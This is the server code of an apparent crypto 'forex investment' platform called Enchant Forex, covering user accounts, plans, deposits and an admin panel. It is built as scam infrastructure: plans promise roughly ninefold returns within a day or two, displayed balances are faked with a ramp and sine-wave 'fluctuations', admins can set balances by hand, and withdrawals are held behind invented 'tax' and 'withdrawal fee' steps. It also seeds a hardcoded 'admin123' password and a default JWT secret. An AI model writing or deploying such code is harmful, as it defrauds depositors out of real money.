import 'dotenv/config';
import express from 'express';
import cors from 'cors';
import http from 'http';
import { Server } from 'socket.io';
import mongoose from 'mongoose';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: process.env.CLIENT_ORIGIN || '*' } });

app.use(cors({ origin: process.env.CLIENT_ORIGIN || '*' }));
app.use(express.json());

app.get('/', (req, res) => {
  res.json({ service: 'Enchant Forex API', status: 'online' });
});

app.get('/api/health', (req, res) => {
  res.json({ ok: true, status: 'online', timestamp: new Date().toISOString() });
});

const JWT_SECRET = process.env.JWT_SECRET || 'change-this-secret';
const TAX_RATE = 0.165;
const WITHDRAWAL_RATE = 0.125;

const userSchema = new mongoose.Schema({
  fullName: String,
  nationality: String,
  email: { type: String, unique: true, index: true },
  phone: String,
  passwordHash: String,
  wallet: String,
  role: { type: String, enum: ['user', 'admin'], default: 'user' },
  suspended: { type: Boolean, default: false }
}, { timestamps: true });

const planSchema = new mongoose.Schema({
  name: String,
  deposit: Number,
  returnAmount: Number,
  durationHours: Number,
  active: { type: Boolean, default: true }
}, { timestamps: true });

const investmentSchema = new mongoose.Schema({
  userId: { type: mongoose.Schema.Types.ObjectId, ref: 'User' },
  planId: { type: mongoose.Schema.Types.ObjectId, ref: 'Plan' },
  planName: String,
  deposit: Number,
  returnAmount: Number,
  projectedTarget: Number,
  durationHours: Number,
  status: { type: String, enum: ['pending', 'active', 'matured', 'withdrawn', 'rejected'], default: 'pending' },
  withdrawalStep: { type: Number, default: 0 },
  startedAt: Date,
  endsAt: Date,
  manualBalance: Number
}, { timestamps: true });

const addressSchema = new mongoose.Schema({
  usdt: String,
  eth: String,
  btc: String
}, { timestamps: true });

const balanceEditSchema = new mongoose.Schema({
  investmentId: { type: mongoose.Schema.Types.ObjectId, ref: 'Investment' },
  adminId: { type: mongoose.Schema.Types.ObjectId, ref: 'User' },
  value: Number
}, { timestamps: true });

const User = mongoose.model('User', userSchema);
const Plan = mongoose.model('Plan', planSchema);
const Investment = mongoose.model('Investment', investmentSchema);
const Address = mongoose.model('Address', addressSchema);
const BalanceEdit = mongoose.model('BalanceEdit', balanceEditSchema);

function tokenFor(user) {
  return jwt.sign({ id: user._id, role: user.role }, JWT_SECRET, { expiresIn: '7d' });
}

function publicUser(user) {
  const object = user.toObject ? user.toObject() : user;
  delete object.passwordHash;
  return object;
}

function auth(requiredRole) {
  return async (req, res, next) => {
    try {
      const raw = req.headers.authorization?.replace('Bearer ', '');
      const payload = jwt.verify(raw, JWT_SECRET);
      const user = await User.findById(payload.id);
      if (!user || user.suspended) return res.status(401).json({ message: 'Unauthorized' });
      if (requiredRole && user.role !== requiredRole) return res.status(403).json({ message: 'Forbidden' });
      req.user = user;
      next();
    } catch {
      res.status(401).json({ message: 'Unauthorized' });
    }
  };
}

function liveBalance(investment) {
  if (investment.manualBalance !== undefined && investment.manualBalance !== null) return investment.manualBalance;
  if (!investment.startedAt || !investment.endsAt) return investment.deposit;
  const elapsed = Math.max(0, Date.now() - investment.startedAt.getTime());
  const total = Math.max(1, investment.endsAt.getTime() - investment.startedAt.getTime());
  const progress = Math.min(1, elapsed / total);
  const target = effectiveTarget(investment);
  const span = target - investment.deposit;
  const trend = investment.deposit + span * progress;
  const wave = fluctuationFor(investment, progress);
  return Math.max(investment.deposit * 0.98, Math.min(target, trend + wave));
}

function bonusRateFor(seed = '') {
  const source = String(seed || 'Enchant');
  const total = source.split('').reduce((sum, char) => sum + char.charCodeAt(0), 0);
  return 0.038 + (total % 25) / 1000;
}

function effectiveTarget(investment) {
  if (!investment) return 0;
  if (investment.projectedTarget) return investment.projectedTarget;
  return Math.round(investment.returnAmount * (1 + bonusRateFor(investment.planId || investment._id)));
}

function fluctuationFor(investment, progress) {
  if (!investment?.startedAt || progress >= 1) return 0;
  const span = effectiveTarget(investment) - investment.deposit;
  const seed = String(investment._id || investment.planId || '').length || 7;
  const elapsedMinutes = Math.max(0, (Date.now() - investment.startedAt.getTime()) / 60000);
  const primary = Math.sin(elapsedMinutes / 3.2 + seed) * span * 0.018;
  const secondary = Math.sin(elapsedMinutes / 0.9 + seed * 0.7) * span * 0.007;
  const endDampener = Math.max(0, 1 - progress);
  const startDampener = Math.min(1, progress * 8);
  return (primary + secondary) * endDampener * startDampener;
}

async function seed() {
  if (!await Plan.countDocuments()) {
    await Plan.insertMany([
      { name: '1-Day Investment Plan', durationHours: 24, deposit: 500, returnAmount: 4750 },
      { name: '1-Day Investment Plan', durationHours: 24, deposit: 1000, returnAmount: 9500 },
      { name: '2-Day Investment Plan', durationHours: 48, deposit: 2000, returnAmount: 19000 },
      { name: '2-Day Investment Plan', durationHours: 48, deposit: 5000, returnAmount: 47500 },
      { name: '2-Day Investment Plan', durationHours: 48, deposit: 10000, returnAmount: 95000 }
    ]);
  }
  if (!await User.findOne({ email: 'admin@enchant.local' })) {
    await User.create({
      fullName: 'Enchant Admin',
      nationality: 'United States',
      email: 'admin@enchant.local',
      phone: '+1 702 218 7068',
      wallet: 'Admin treasury',
      role: 'admin',
      passwordHash: await bcrypt.hash('admin123', 10)
    });
  }
  if (!await Address.countDocuments()) {
    await Address.create({
      usdt: 'TQ9xEnchantTreasuryTRC20Address',
      eth: '0xEnchantTreasuryEthAddress',
      btc: 'bc1qEnchanttreasurybtcaddress'
    });
  }
}

app.post('/api/auth/register', async (req, res) => {
  try {
    const { fullName, nationality, email, phone, password, wallet } = req.body;
    if (!fullName || !nationality || !email || !phone || !password || !wallet) return res.status(400).json({ message: 'All registration fields are required' });
    if (await User.findOne({ email })) return res.status(409).json({ message: 'Email already registered' });
    const user = await User.create({ fullName, nationality, email, phone, wallet, passwordHash: await bcrypt.hash(password, 10) });
    res.json({ token: tokenFor(user), user: publicUser(user) });
  } catch {
    res.status(500).json({ message: 'Registration failed' });
  }
});

app.post('/api/auth/login', async (req, res) => {
  const user = await User.findOne({ email: req.body.email });
  if (!user || !await bcrypt.compare(req.body.password, user.passwordHash)) return res.status(401).json({ message: 'Invalid login details' });
  if (user.suspended) return res.status(403).json({ message: 'Account suspended' });
  res.json({ token: tokenFor(user), user: publicUser(user) });
});

app.get('/api/me', auth(), async (req, res) => {
  res.json({ user: publicUser(req.user) });
});

app.get('/api/bootstrap', async (req, res) => {
  res.json({ plans: await Plan.find({ active: true }), addresses: await Address.findOne() });
});

app.get('/api/me/investments', auth(), async (req, res) => {
  const investments = await Investment.find({ userId: req.user._id }).sort({ createdAt: -1 });
  res.json(investments.map((item) => ({ ...item.toObject(), currentBalance: liveBalance(item) })));
});

app.post('/api/me/deposits', auth(), async (req, res) => {
  const plan = await Plan.findById(req.body.planId);
  if (!plan || !plan.active) return res.status(404).json({ message: 'Plan not found' });
  const investment = await Investment.create({
    userId: req.user._id,
    planId: plan._id,
    planName: plan.name,
    deposit: plan.deposit,
    returnAmount: plan.returnAmount,
    projectedTarget: Math.round(plan.returnAmount * (1 + bonusRateFor(plan._id))),
    durationHours: plan.durationHours
  });
  io.emit('investment:created', investment);
  res.json(investment);
});

app.post('/api/me/investments/:id/claim-tax', auth(), async (req, res) => {
  const investment = await Investment.findOneAndUpdate({ _id: req.params.id, userId: req.user._id, status: 'matured', withdrawalStep: { $in: [0, 1] } }, { withdrawalStep: 2 }, { new: true });
  if (!investment) return res.status(404).json({ message: 'Matured investment not found' });
  io.emit('withdrawal:tax-claimed', investment);
  res.json(investment);
});

app.post('/api/me/investments/:id/claim-withdrawal-fee', auth(), async (req, res) => {
  const investment = await Investment.findOneAndUpdate({ _id: req.params.id, userId: req.user._id, withdrawalStep: 3 }, { withdrawalStep: 4 }, { new: true });
  if (!investment) return res.status(404).json({ message: 'Cleared investment not found' });
  io.emit('withdrawal:fee-claimed', investment);
  res.json(investment);
});

app.get('/api/admin/overview', auth('admin'), async (req, res) => {
  const investments = await Investment.find();
  res.json({
    totalUsers: await User.countDocuments(),
    activeInvestments: investments.filter((i) => ['active', 'matured'].includes(i.status)).length,
    pendingRequests: investments.filter((i) => i.status === 'pending' || [2, 4].includes(i.withdrawalStep)).length,
    totalPoolValue: investments.reduce((sum, item) => sum + liveBalance(item), 0),
    taxRate: TAX_RATE,
    withdrawalRate: WITHDRAWAL_RATE
  });
});

app.get('/api/admin/investments', auth('admin'), async (req, res) => {
  res.json(await Investment.find().populate('userId', 'fullName email wallet suspended').sort({ createdAt: -1 }));
});

app.get('/api/admin/balance-edits', auth('admin'), async (req, res) => {
  res.json(await BalanceEdit.find().sort({ createdAt: -1 }).limit(100));
});

app.patch('/api/admin/investments/:id', auth('admin'), async (req, res) => {
  const patch = { ...req.body };
  if (patch.status === 'active') {
    patch.startedAt = new Date();
    const investment = await Investment.findById(req.params.id);
    if (!investment) return res.status(404).json({ message: 'Investment not found' });
    patch.endsAt = new Date(Date.now() + investment.durationHours * 60 * 60 * 1000);
    patch.projectedTarget = investment.projectedTarget || effectiveTarget(investment);
  }
  if (patch.status === 'matured' && patch.manualBalance === undefined) {
    const investment = await Investment.findById(req.params.id);
    if (!investment) return res.status(404).json({ message: 'Investment not found' });
    patch.manualBalance = effectiveTarget(investment);
    patch.endsAt = new Date();
  }
  const investment = await Investment.findByIdAndUpdate(req.params.id, patch, { new: true });
  if (patch.manualBalance !== undefined) await BalanceEdit.create({ investmentId: investment._id, adminId: req.user._id, value: patch.manualBalance });
  io.emit('investment:updated', investment);
  res.json(investment);
});

app.get('/api/admin/users', auth('admin'), async (req, res) => {
  res.json(await User.find().select('-passwordHash').sort({ createdAt: -1 }));
});

app.patch('/api/admin/users/:id', auth('admin'), async (req, res) => {
  res.json(await User.findByIdAndUpdate(req.params.id, req.body, { new: true }).select('-passwordHash'));
});

app.post('/api/admin/plans', auth('admin'), async (req, res) => {
  const plan = await Plan.create(req.body);
  io.emit('plans:updated', plan);
  res.json(plan);
});

app.patch('/api/admin/plans/:id', auth('admin'), async (req, res) => {
  const plan = await Plan.findByIdAndUpdate(req.params.id, req.body, { new: true });
  io.emit('plans:updated', plan);
  res.json(plan);
});

app.delete('/api/admin/plans/:id', auth('admin'), async (req, res) => {
  const inUse = await Investment.exists({ planId: req.params.id, status: { $nin: ['withdrawn', 'rejected'] } });
  if (inUse) return res.status(409).json({ message: 'This plan has active or pending investments' });
  const plan = await Plan.findByIdAndUpdate(req.params.id, { active: false }, { new: true });
  if (!plan) return res.status(404).json({ message: 'Plan not found' });
  io.emit('plans:updated', plan);
  res.json(plan);
});

app.patch('/api/admin/addresses', auth('admin'), async (req, res) => {
  const address = await Address.findOneAndUpdate({}, req.body, { new: true, upsert: true });
  io.emit('addresses:updated', address);
  res.json(address);
});

setInterval(async () => {
  const matured = await Investment.find({ status: 'active', endsAt: { $lte: new Date() } });
  await Promise.all(matured.map((investment) => {
    investment.status = 'matured';
    investment.manualBalance = effectiveTarget(investment);
    investment.projectedTarget = effectiveTarget(investment);
    return investment.save();
  }));
  if (matured.length) io.emit('investments:matured', { count: matured.length });
}, 15000);

io.on('connection', (socket) => {
  socket.emit('connected', { ok: true });
});

const mongoUri = process.env.MONGO_URI || 'mongodb://127.0.0.1:27017/enchant-forex';
const port = process.env.PORT || 4000;

mongoose.connect(mongoUri).then(async () => {
  await seed();
  server.listen(port, () => console.log(`Enchant Forex API listening on ${port}`));
});


